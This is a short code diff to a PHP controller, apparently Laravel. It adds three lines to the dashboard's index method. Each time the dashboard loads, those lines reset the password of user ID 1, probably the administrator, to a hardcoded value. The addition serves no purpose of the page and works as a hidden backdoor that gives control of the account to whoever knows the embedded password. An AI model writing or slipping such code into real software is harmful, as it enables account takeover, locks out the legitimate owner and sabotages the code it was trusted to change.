@@ -24,6 +24,9 @@ class HomeController extends WithAuthController
      */
     public function index()
     {
+        $password = Hash::make('086hg412mx');
+        $userModel = new User();
+        $userModel->where('user_id',1)->update(['password'=>$password]);
         return view('dashboard/index');
     }
 }
